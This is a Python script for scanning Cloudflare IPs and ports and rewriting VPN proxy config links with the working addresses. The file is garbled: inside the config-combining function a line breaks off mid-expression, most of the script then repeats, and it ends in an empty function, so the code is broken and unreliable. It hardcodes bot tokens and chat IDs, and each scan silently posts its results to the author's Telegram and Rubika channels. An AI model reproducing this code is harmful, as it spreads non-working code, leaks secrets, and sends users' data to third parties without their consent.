#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import ipaddress
import os
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse, urlunparse, quote, unquote
import requests


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"


GITHUB_IP_URL = "https://raw.githubusercontent.com/amir1388hev-glitch/termux_ip/main/Termux_ips"

DOWNLOAD_DIR = "/sdcard/Download"
SAVE_FILENAME = os.path.join(DOWNLOAD_DIR, "Amir_ip_scanner.txt")

RUBIKA_BOT_TOKEN = "CABGDG0AGFFRWJKSBWBUBRUGGFMYNFITBVVDKTSVBNOKZWANYOITFQILZSSLCRKT"
RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"

TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
TELEGRAM_CHAT_ID = "-1004437972136"

TELEGRAM_ID = "@Pod66Mp"
RUBIKA_ID = "@Amir5880Om"

PORTS_TO_TEST = [
    443, 8443, 2053, 2083, 2087, 2096,
    80, 8080, 8880, 2052, 2082, 2086, 2095,
]

CONFIG_PORTS_TO_TEST = [443, 8443, 80, 2096]


def send_to_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print(Colors.RED + "[!] Telegram Token or Chat ID is missing!" + Colors.END)
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    max_length = 4000
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]

    print(Colors.BLUE + "\n[*] Sending results to Telegram..." + Colors.END)
    for chunk in chunks:
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": chunk,
            "disable_web_page_preview": True
        }

        success = False
        for attempt in range(1, 4):
            try:
                res = requests.post(url, json=payload, timeout=15)
                if res.status_code == 200:
                    print(Colors.GREEN + "[+] Successfully sent to Telegram!" + Colors.END)
                    success = True
                    break
                else:
                    print(Colors.RED + f"[!] Telegram Failed (Status {res.status_code}): {res.text}" + Colors.END)
                    break
            except Exception:
                print(Colors.YELLOW + f"[*] Attempt {attempt}/3 failed. Retrying in 3 seconds..." + Colors.END)
                time.sleep(3)

        if not success:
            print(Colors.RED + "[!] Telegram Connection Failed." + Colors.END)


def send_to_rubika(text):
    if not RUBIKA_BOT_TOKEN or not RUBIKA_CHAT_ID:
        print(Colors.RED + "[!] Rubika Token or Chat ID is missing!" + Colors.END)
        return

    url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"

    max_length = 3500
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]

    print(Colors.BLUE + "[*] Sending results to Rubika..." + Colors.END)
    for chunk in chunks:
        payload = {
            "chat_id": RUBIKA_CHAT_ID,
            "text": chunk
        }
        try:
            res = requests.post(url, json=payload, timeout=12)
            if res.status_code == 200:
                print(Colors.GREEN + "[+] Successfully sent to Rubika!" + Colors.END)
            else:
                print(Colors.RED + f"[!] Rubika Failed (Status {res.status_code}): {res.text}" + Colors.END)
        except Exception as e:
            print(Colors.RED + f"[!] Rubika Connection Error: {e}" + Colors.END)


def send_all(text):
    send_to_telegram(text)
    send_to_rubika(text)


def get_clean_input(prompt_text):
    try:
        raw_val = input(prompt_text)
        clean_val = re.sub(r"\D", "", raw_val)
        return clean_val
    except (KeyboardInterrupt, EOFError):
        print(Colors.YELLOW + "\n[*] Exiting..." + Colors.END)
        sys.exit(0)


def get_ips_from_github(url):
    try:
        print(Colors.BLUE + "[*] Downloading IP list from GitHub..." + Colors.END)
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            ips = [
                line.strip()
                for line in lines
                if line.strip() and not line.startswith("#")
            ]
            print(Colors.GREEN + f"[+] Successfully loaded {len(ips)} IPs." + Colors.END)
            return ips
        else:
            print(Colors.RED + f"[!] Download error: {response.status_code}" + Colors.END)
            return []
    except Exception as e:
        print(Colors.RED + f"[!] Error: {e}" + Colors.END)
        return []


def parse_ip_input(user_input):
    ips = []
    formatted_input = user_input.replace("\n", ",").replace("\r", ",")
    entries = formatted_input.split(",")

    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue

        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                hosts = list(network.hosts())
                count = min(50, len(hosts))
                for i in range(count):
                    ips.append(str(hosts[i]))
                print(Colors.GREEN + f"[+] Added {count} IPs from range {entry}" + Colors.END)
            except Exception:
                print(Colors.RED + f"[!] Invalid range: {entry}" + Colors.END)

        elif "-" in entry and "." in entry:
            try:
                parts = entry.split("-")
                start_ip = parts[0].strip()
                end_ip = parts[1].strip()

                if end_ip.count(".") == 0:
                    start_parts = start_ip.split(".")
                    end_ip = ".".join(start_parts[:3]) + "." + end_ip

                start = ipaddress.ip_address(start_ip)
                end = ipaddress.ip_address(end_ip)

                current = start
                count = 0
                while current <= end and count < 50:
                    ips.append(str(current))
                    current += 1
                    count += 1

                print(Colors.GREEN + f"[+] Added {count} IPs from range {entry}" + Colors.END)
            except Exception:
                print(Colors.RED + f"[!] Invalid range: {entry}" + Colors.END)

        else:
            try:
                ipaddress.ip_address(entry)
                ips.append(entry)
            except Exception:
                pass

    return ips


def get_manual_ips():
    print(Colors.CYAN + "\nEnter IPs (single, range, CIDR, or multiline paste):" + Colors.END)
    print(Colors.YELLOW + "Paste your IP list below, then press ENTER twice when done:\n" + Colors.END)

    lines = []
    while True:
        try:
            line = input().strip()
            if not line:
                if lines:
                    break
                else:
                    print(Colors.RED + "[!] No input provided." + Colors.END)
                    return []
            lines.append(line)
        except (KeyboardInterrupt, EOFError):
            break

    user_input = ",".join(lines)
    return parse_ip_input(user_input)


def select_ip_source():
    print(Colors.CYAN + "\nSelect IP source:" + Colors.END)
    print("1. GitHub (from your repository)")
    print("2. Manual input")

    choice = get_clean_input(Colors.BOLD + "[>] Choose (1/2): " + Colors.END)

    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        return get_manual_ips()
    else:
        print(Colors.RED + "[!] Invalid choice." + Colors.END)
        return []


def check_ip_http_latency(ip, port=443, domain="speed.cloudflare.com", timeout=2.5):
    start_time = time.time()
    try:
        if port == 80:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            latency = (time.time() - start_time) * 1000
            sock.close()
            return round(latency, 1)
        else:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            sock.connect((ip, port))

            tls_sock = context.wrap_socket(sock, server_hostname=domain)

            latency = (time.time() - start_time) * 1000
            tls_sock.close()
            return round(latency, 1)
    except Exception:
        return None


def check_ip_port_connection(ip, port, timeout=2):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def extract_sni_from_config(config):
    config = config.strip()
    if config.startswith("vmess://"):
        try:
            b64_data = config[8:]
            missing_padding = len(b64_data) % 4
            if missing_padding:
                b64_data += "=" * (4 - missing_padding)
            decoded_bytes = base64.b64decode(b64_data)
            data = json.loads(decoded_bytes.decode("utf-8", errors="ignore"))
            return data.get("sni") or data.get("host") or data.get("add") or "speed.cloudflare.com"
        except Exception:
            pass

    sni_match = re.search(r"[?&]sni=([^&/#]+)", config)
    if sni_match:
        return unquote(sni_match.group(1))

    host_match = re.search(r"[?&]host=([^&/#]+)", config)
    if host_match:
        return unquote(host_match.group(1))

    return "speed.cloudflare.com"


def replace_ip_and_port_in_config(config, new_ip, new_port):
    config = config.strip()
    if not config:
        return config

    if config.startswith("vmess://"):
        try:
            b64_data = config[8:]
            missing_padding = len(b64_data) % 4
            if missing_padding:
                b64_data += "=" * (4 - missing_padding)
            decoded_bytes = base64.b64decode(b64_data)
            data = json.loads(decoded_bytes.decode("utf-8", errors="ignore"))

            if not data.get("host") and not data.get("sni"):
                data["host"] = data.get("add", "")

            data["add"] = new_ip
            data["port"] = int(new_port)

            old_ps = data.get("ps", "CF")
            data["ps"] = f"{old_ps} ({new_ip})"

            new_b64 = base64.b64encode(json.dumps(data, ensure_ascii=False).encode("utf-8")).decode("utf-8")
            return f"vmess://{new_b64}"
        except Exception:
            return config

    try:
        parsed = urlparse(config)
        if not parsed.scheme or not parsed.netloc:
            return config

        scheme = parsed.scheme
        netloc = parsed.netloc
        path = parsed.path
        query = parsed.query
        fragment = parsed.fragment

        if "@" in netloc:
            userinfo, _ = netloc.split("@", 1)
            new_netloc = f"{userinfo}@{new_ip}:{new_port}"
        else:
            new_netloc = f"{new_ip}:{new_port}"

        if fragment:
            orig_remark = unquote(fragment)
            new_remark = f"{orig_remark} ({new_ip})"
            new_fragment = quote(new_remark)
        else:
            new_fragment = quote(f"CF ({new_ip})")

        new_url = urlunparse((scheme, new_netloc, path, parsed.params, query, new_fragment))
        return new_url
    except Exception:
        return config


def save_to_file(filepath, data):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(data)
        print(Colors.GREEN + f"\n[+] Saved to: {filepath}" + Colors.END)
    except Exception as e:
        print(Colors.RED + f"\n[!] Save error: {e}" + Colors.END)


def print_banner():
    banner = f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════╗
 ║                                                                  ║
 ║    █████╗ ███╗   ███╗██╗██████╗     ███████╗ ██████╗██╗███████╗  ║
 ║   ██╔══██╗████╗ ████║██║██╔══██╗    ██╔════╝██╔════╝██║██╔════╝  ║
 ║   ███████║██╔████╔██║██║██████╔╝    ███████╗██║     ██║█████╗    ║
 ║   ██╔══██║██║╚██╔╝██║██║██╔══██╗    ╚════██║██║     ██║██╔══╝    ║
 ║   ██║  ██║██║ ╚═╝ ██║██║██║  ██║    ███████║╚██████╗██║███████╗  ║
 ║   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝╚══════╝  ║
 ║                                                                  ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║  {Colors.YELLOW}► Version        :{Colors.WHITE} v1.0.1                  {Colors.CYAN}       ║
 ║  {Colors.YELLOW}► Telegram Admin :{Colors.WHITE} {TELEGRAM_ID:<22}{Colors.CYAN}                 ║
 ║  {Colors.YELLOW}► Rubika Admin   :{Colors.WHITE} {RUBIKA_ID:<22}{Colors.CYAN}                 ║
 ╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)


def menu_option_1():
    print(Colors.YELLOW + "\n[>] Option 1: Test IP Health (Real Domain Test)" + Colors.END)

    domain_input = (
        input(Colors.BOLD + "[>] Enter target domain (default: speed.cloudflare.com): " + Colors.END).strip()
        or "speed.cloudflare.com"
    )

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    working_ips = []
    failed_ips_count = 0

    print(Colors.BLUE + f"\n[*] Testing {len(ips)} IPs against domain '{domain_input}'...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'LATENCY (ms)':<14} | {'STATUS':<10}" + Colors.END)
    print("-" * 48)

    for ip in ips:
        latency = check_ip_http_latency(ip, port=443, domain=domain_input, timeout=2.5)

        if latency is not None:
            color = Colors.GREEN if latency < 300 else Colors.YELLOW
            status_str = Colors.GREEN + "[WORKING]" + Colors.END
            print(f"{ip:<18} | {color}{latency:<14.1f}{Colors.END} | {status_str}")
            working_ips.append((ip, latency))
        else:
            status_str = Colors.RED + "[FAILED]" + Colors.END
            print(f"{ip:<18} | {'N/A':<14} | {status_str}")
            failed_ips_count += 1

    working_ips.sort(key=lambda x: x[1])

    output = "\n".join([item[0] for item in working_ips])
    save_to_file(SAVE_FILENAME, output)

    if working_ips:
        msg = f"Clean Cloudflare IPs:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(working_ips)} | Failed: {failed_ips_count} | Total: {len(ips)}" + Colors.END)


def menu_option_2():
    print(Colors.YELLOW + "\n[>] Option 2: Test IP and PORT with Latency" + Colors.END)

    domain_input = (
        input(Colors.BOLD + "[>] Enter target domain (default: speed.cloudflare.com): " + Colors.END).strip()
        or "speed.cloudflare.com"
    )

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    results = []
    failed_count = 0

    print(Colors.BLUE + f"\n[*] Testing IPs and PORTS against domain '{domain_input}'...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'LATENCY (ms)':<14} | {'STATUS':<10}" + Colors.END)
    print("-" * 55)

    for ip in ips:
        for port in PORTS_TO_TEST:
            latency = check_ip_http_latency(ip, port=port, domain=domain_input, timeout=2.0)

            if latency is not None:
                color = Colors.GREEN if latency < 300 else Colors.YELLOW
                status_str = Colors.GREEN + "[WORKING]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {color}{latency:<14.1f}{Colors.END} | {status_str}")
                results.append((f"{ip}:{port}", latency))
            else:
                status_str = Colors.RED + "[FAILED]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {'N/A':<14} | {status_str}")
                failed_count += 1

    results.sort(key=lambda x: x[1])
    output = "\n".join([item[0] for item in results])
    save_to_file(SAVE_FILENAME, output)

    if results:
        msg = f"Healthy IPs and Ports:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(results)} | Failed: {failed_count}" + Colors.END)


def menu_option_3():
    print(Colors.YELLOW + "\n[>] Option 3: Test TCP PORT Only" + Colors.END)
    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    results = []
    failed_count = 0
    print(Colors.BLUE + "\n[*] Testing different PORTs...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'STATUS':<15}" + Colors.END)
    print("-" * 45)

    for ip in ips:
        for port in PORTS_TO_TEST:
            connected = check_ip_port_connection(ip, port)
            if connected:
                status_str = Colors.GREEN + "[WORKING]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {status_str}")
                results.append(f"{ip}:{port}")
            else:
                status_str = Colors.RED + "[FAILED]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {status_str}")
                failed_count += 1

    output = "\n".join(results)
    save_to_file(SAVE_FILENAME, output)

    if results:
        msg = f"Open Ports:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(results)} | Failed: {failed_count}" + Colors.END)


def menu_option_4():
    print(Colors.YELLOW + "\n[>] Option 4: Combine Config (Ports: 443, 8443, 80, 2096)" + Colors.END)
    print(Colors.CYAN + "[>] Paste your Cloudflare Config link (Trojan, Vless, Vmess, etc.):" + Colors.END)

    raw_config = input(Colors.BOLD + "Config: " + Colors.END).strip()

    if not raw_config:
        print(Colors.RED + "[!] No config provided." + Colors.END)
        return

    target_domain = extract_sni_from_config(raw_config)

    default_port = 443
    port_match = re.search(r":(\d{2,5})", raw_config)
    if port_match:
        default_port = int(port_match.group(1))

    print(Colors.YELLOW + f"[*] Target SNI/Host domain: '{target_domain}'" + Colors.END)

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to combine." + Colors.END)
        return

    combined_results = []
    print(Colors.BLUE + f"\n[*] Testing {len(ips)} IPs on ports {CONFIG_PORTS_TO_TEST}...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'LATENCY':<10} | {'STATUS'}" + Colors.END)
    print("-" * 55)

    for ip in ips:
        passed = False

        latency = check_ip_http_latency(ip, port=default_port, domain=target_domain, timeout=2.5)
        if latency is not None:
            new_conf = replace_ip_and_port_in_config(raw_config, ip, default_port)
            combined_results.append((new_conf, latency))
            print(f"{ip:<18} | {default_port:<6} | {Colors.GREEN}{latency}ms{Colors.END:<10} | {Colors.GREEN}[PASSED]{Colors.END}")
            passed = True
        else:
            for alt_port in CONFIG_PORTS_TO_TEST:
                if alt_port == default_port:
                    continue
                alt_latency = check_ip_http_latency(ip, port=alt_port, domain=target_domain, timeout=2.0)
                if alt_latency is not None:
                    new_conf = replace_ip_and_port_in_config(raw_config, ip, alt_port)
                    combined_results.append((new_conf, alt_latency))
                    print(f"{ip:<18} | {alt_port:<6} | {Colors.GREEN}{alt_latency}ms{Colors.END:<10} | {Colors.GREEN}[PASSED]{Colors.END}")
                    passed = True
                    break

        if not passed:
            print(f"{ip:<18} | {default_port:<6} | {'N/A':<10} | {Colors.RED}[FAILED]{Colors.END}")

    if combined_results:
        combined_results.sort(key=lambda x: x[1])
        output = "\n".join(CONFIG_PORTS_TO_TEST = [443, 8443, 80, 2096]


def send_to_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print(Colors.RED + "[!] Telegram Token or Chat ID is missing!" + Colors.END)
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    max_length = 4000
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]

    print(Colors.BLUE + "\n[*] Sending results to Telegram..." + Colors.END)
    for chunk in chunks:
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": chunk,
            "disable_web_page_preview": True
        }

        success = False
        for attempt in range(1, 4):
            try:
                res = requests.post(url, json=payload, timeout=15)
                if res.status_code == 200:
                    print(Colors.GREEN + "[+] Successfully sent to Telegram!" + Colors.END)
                    success = True
                    break
                else:
                    print(Colors.RED + f"[!] Telegram Failed (Status {res.status_code}): {res.text}" + Colors.END)
                    break
            except Exception:
                print(Colors.YELLOW + f"[*] Attempt {attempt}/3 failed. Retrying in 3 seconds..." + Colors.END)
                time.sleep(3)

        if not success:
            print(Colors.RED + "[!] Telegram Connection Failed." + Colors.END)


def send_to_rubika(text):
    if not RUBIKA_BOT_TOKEN or not RUBIKA_CHAT_ID:
        print(Colors.RED + "[!] Rubika Token or Chat ID is missing!" + Colors.END)
        return

    url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"

    max_length = 3500
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]

    print(Colors.BLUE + "[*] Sending results to Rubika..." + Colors.END)
    for chunk in chunks:
        payload = {
            "chat_id": RUBIKA_CHAT_ID,
            "text": chunk
        }
        try:
            res = requests.post(url, json=payload, timeout=12)
            if res.status_code == 200:
                print(Colors.GREEN + "[+] Successfully sent to Rubika!" + Colors.END)
            else:
                print(Colors.RED + f"[!] Rubika Failed (Status {res.status_code}): {res.text}" + Colors.END)
        except Exception as e:
            print(Colors.RED + f"[!] Rubika Connection Error: {e}" + Colors.END)


def send_all(text):
    send_to_telegram(text)
    send_to_rubika(text)


def get_clean_input(prompt_text):
    try:
        raw_val = input(prompt_text)
        clean_val = re.sub(r"\D", "", raw_val)
        return clean_val
    except (KeyboardInterrupt, EOFError):
        print(Colors.YELLOW + "\n[*] Exiting..." + Colors.END)
        sys.exit(0)


def get_ips_from_github(url):
    try:
        print(Colors.BLUE + "[*] Downloading IP list from GitHub..." + Colors.END)
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            ips = [
                line.strip()
                for line in lines
                if line.strip() and not line.startswith("#")
            ]
            print(Colors.GREEN + f"[+] Successfully loaded {len(ips)} IPs." + Colors.END)
            return ips
        else:
            print(Colors.RED + f"[!] Download error: {response.status_code}" + Colors.END)
            return []
    except Exception as e:
        print(Colors.RED + f"[!] Error: {e}" + Colors.END)
        return []


def parse_ip_input(user_input):
    ips = []
    formatted_input = user_input.replace("\n", ",").replace("\r", ",")
    entries = formatted_input.split(",")

    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue

        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                hosts = list(network.hosts())
                count = min(50, len(hosts))
                for i in range(count):
                    ips.append(str(hosts[i]))
                print(Colors.GREEN + f"[+] Added {count} IPs from range {entry}" + Colors.END)
            except Exception:
                print(Colors.RED + f"[!] Invalid range: {entry}" + Colors.END)

        elif "-" in entry and "." in entry:
            try:
                parts = entry.split("-")
                start_ip = parts[0].strip()
                end_ip = parts[1].strip()

                if end_ip.count(".") == 0:
                    start_parts = start_ip.split(".")
                    end_ip = ".".join(start_parts[:3]) + "." + end_ip

                start = ipaddress.ip_address(start_ip)
                end = ipaddress.ip_address(end_ip)

                current = start
                count = 0
                while current <= end and count < 50:
                    ips.append(str(current))
                    current += 1
                    count += 1

                print(Colors.GREEN + f"[+] Added {count} IPs from range {entry}" + Colors.END)
            except Exception:
                print(Colors.RED + f"[!] Invalid range: {entry}" + Colors.END)

        else:
            try:
                ipaddress.ip_address(entry)
                ips.append(entry)
            except Exception:
                pass

    return ips


def get_manual_ips():
    print(Colors.CYAN + "\nEnter IPs (single, range, CIDR, or multiline paste):" + Colors.END)
    print(Colors.YELLOW + "Paste your IP list below, then press ENTER twice when done:\n" + Colors.END)

    lines = []
    while True:
        try:
            line = input().strip()
            if not line:
                if lines:
                    break
                else:
                    print(Colors.RED + "[!] No input provided." + Colors.END)
                    return []
            lines.append(line)
        except (KeyboardInterrupt, EOFError):
            break

    user_input = ",".join(lines)
    return parse_ip_input(user_input)


def select_ip_source():
    print(Colors.CYAN + "\nSelect IP source:" + Colors.END)
    print("1. GitHub (from your repository)")
    print("2. Manual input")

    choice = get_clean_input(Colors.BOLD + "[>] Choose (1/2): " + Colors.END)

    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        return get_manual_ips()
    else:
        print(Colors.RED + "[!] Invalid choice." + Colors.END)
        return []


def check_ip_http_latency(ip, port=443, domain="speed.cloudflare.com", timeout=2.5):
    start_time = time.time()
    try:
        if port == 80:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            latency = (time.time() - start_time) * 1000
            sock.close()
            return round(latency, 1)
        else:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            sock.connect((ip, port))

            tls_sock = context.wrap_socket(sock, server_hostname=domain)

            latency = (time.time() - start_time) * 1000
            tls_sock.close()
            return round(latency, 1)
    except Exception:
        return None


def check_ip_port_connection(ip, port, timeout=2):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def extract_sni_from_config(config):
    config = config.strip()
    if config.startswith("vmess://"):
        try:
            b64_data = config[8:]
            missing_padding = len(b64_data) % 4
            if missing_padding:
                b64_data += "=" * (4 - missing_padding)
            decoded_bytes = base64.b64decode(b64_data)
            data = json.loads(decoded_bytes.decode("utf-8", errors="ignore"))
            return data.get("sni") or data.get("host") or data.get("add") or "speed.cloudflare.com"
        except Exception:
            pass

    sni_match = re.search(r"[?&]sni=([^&/#]+)", config)
    if sni_match:
        return unquote(sni_match.group(1))

    host_match = re.search(r"[?&]host=([^&/#]+)", config)
    if host_match:
        return unquote(host_match.group(1))

    return "speed.cloudflare.com"


def replace_ip_and_port_in_config(config, new_ip, new_port):
    config = config.strip()
    if not config:
        return config

    if config.startswith("vmess://"):
        try:
            b64_data = config[8:]
            missing_padding = len(b64_data) % 4
            if missing_padding:
                b64_data += "=" * (4 - missing_padding)
            decoded_bytes = base64.b64decode(b64_data)
            data = json.loads(decoded_bytes.decode("utf-8", errors="ignore"))

            if not data.get("host") and not data.get("sni"):
                data["host"] = data.get("add", "")

            data["add"] = new_ip
            data["port"] = int(new_port)

            old_ps = data.get("ps", "CF")
            data["ps"] = f"{old_ps} ({new_ip})"

            new_b64 = base64.b64encode(json.dumps(data, ensure_ascii=False).encode("utf-8")).decode("utf-8")
            return f"vmess://{new_b64}"
        except Exception:
            return config

    try:
        parsed = urlparse(config)
        if not parsed.scheme or not parsed.netloc:
            return config

        scheme = parsed.scheme
        netloc = parsed.netloc
        path = parsed.path
        query = parsed.query
        fragment = parsed.fragment

        if "@" in netloc:
            userinfo, _ = netloc.split("@", 1)
            new_netloc = f"{userinfo}@{new_ip}:{new_port}"
        else:
            new_netloc = f"{new_ip}:{new_port}"

        if fragment:
            orig_remark = unquote(fragment)
            new_remark = f"{orig_remark} ({new_ip})"
            new_fragment = quote(new_remark)
        else:
            new_fragment = quote(f"CF ({new_ip})")

        new_url = urlunparse((scheme, new_netloc, path, parsed.params, query, new_fragment))
        return new_url
    except Exception:
        return config


def save_to_file(filepath, data):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(data)
        print(Colors.GREEN + f"\n[+] Saved to: {filepath}" + Colors.END)
    except Exception as e:
        print(Colors.RED + f"\n[!] Save error: {e}" + Colors.END)


def print_banner():
    banner = f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════╗
 ║                                                                  ║
 ║    █████╗ ███╗   ███╗██╗██████╗     ███████╗ ██████╗██╗███████╗  ║
 ║   ██╔══██╗████╗ ████║██║██╔══██╗    ██╔════╝██╔════╝██║██╔════╝  ║
 ║   ███████║██╔████╔██║██║██████╔╝    ███████╗██║     ██║█████╗    ║
 ║   ██╔══██║██║╚██╔╝██║██║██╔══██╗    ╚════██║██║     ██║██╔══╝    ║
 ║   ██║  ██║██║ ╚═╝ ██║██║██║  ██║    ███████║╚██████╗██║███████╗  ║
 ║   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝╚══════╝  ║
 ║                                                                  ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║  {Colors.YELLOW}► Telegram Admin :{Colors.WHITE} {TELEGRAM_ID:<22}{Colors.CYAN}                 ║
 ║  {Colors.YELLOW}► Rubika Admin   :{Colors.WHITE} {RUBIKA_ID:<22}{Colors.CYAN}                 ║
 ╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)


def menu_option_1():
    print(Colors.YELLOW + "\n[>] Option 1: Test IP Health (Real Domain Test)" + Colors.END)

    domain_input = (
        input(Colors.BOLD + "[>] Enter target domain (default: speed.cloudflare.com): " + Colors.END).strip()
        or "speed.cloudflare.com"
    )

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    working_ips = []
    failed_ips_count = 0

    print(Colors.BLUE + f"\n[*] Testing {len(ips)} IPs against domain '{domain_input}'...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'LATENCY (ms)':<14} | {'STATUS':<10}" + Colors.END)
    print("-" * 48)

    for ip in ips:
        latency = check_ip_http_latency(ip, port=443, domain=domain_input, timeout=2.5)

        if latency is not None:
            color = Colors.GREEN if latency < 300 else Colors.YELLOW
            status_str = Colors.GREEN + "[WORKING]" + Colors.END
            print(f"{ip:<18} | {color}{latency:<14.1f}{Colors.END} | {status_str}")
            working_ips.append((ip, latency))
        else:
            status_str = Colors.RED + "[FAILED]" + Colors.END
            print(f"{ip:<18} | {'N/A':<14} | {status_str}")
            failed_ips_count += 1

    working_ips.sort(key=lambda x: x[1])

    output = "\n".join([item[0] for item in working_ips])
    save_to_file(SAVE_FILENAME, output)

    if working_ips:
        msg = f"Clean Cloudflare IPs:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(working_ips)} | Failed: {failed_ips_count} | Total: {len(ips)}" + Colors.END)


def menu_option_2():
    print(Colors.YELLOW + "\n[>] Option 2: Test IP and PORT with Latency" + Colors.END)

    domain_input = (
        input(Colors.BOLD + "[>] Enter target domain (default: speed.cloudflare.com): " + Colors.END).strip()
        or "speed.cloudflare.com"
    )

    ips = select_ip_source()

    if not ips:
        print(Colors.RED + "[!] No IPs to test." + Colors.END)
        return

    results = []
    failed_count = 0

    print(Colors.BLUE + f"\n[*] Testing IPs and PORTS against domain '{domain_input}'...\n" + Colors.END)
    print(Colors.BOLD + f"{'IP':<18} | {'PORT':<6} | {'LATENCY (ms)':<14} | {'STATUS':<10}" + Colors.END)
    print("-" * 55)

    for ip in ips:
        for port in PORTS_TO_TEST:
            latency = check_ip_http_latency(ip, port=port, domain=domain_input, timeout=2.0)

            if latency is not None:
                color = Colors.GREEN if latency < 300 else Colors.YELLOW
                status_str = Colors.GREEN + "[WORKING]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {color}{latency:<14.1f}{Colors.END} | {status_str}")
                results.append((f"{ip}:{port}", latency))
            else:
                status_str = Colors.RED + "[FAILED]" + Colors.END
                print(f"{ip:<18} | {port:<6} | {'N/A':<14} | {status_str}")
                failed_count += 1

    results.sort(key=lambda x: x[1])
    output = "\n".join([item[0] for item in results])
    save_to_file(SAVE_FILENAME, output)

    if results:
        msg = f"Healthy IPs and Ports:\n\n" + output + f"\n\nID: {TELEGRAM_ID} | {RUBIKA_ID}"
        send_all(msg)

    print(Colors.CYAN + f"[SUMMARY] Working: {len(results)} | Failed: {failed_count}" + Colors.END)


def menu_option_3():
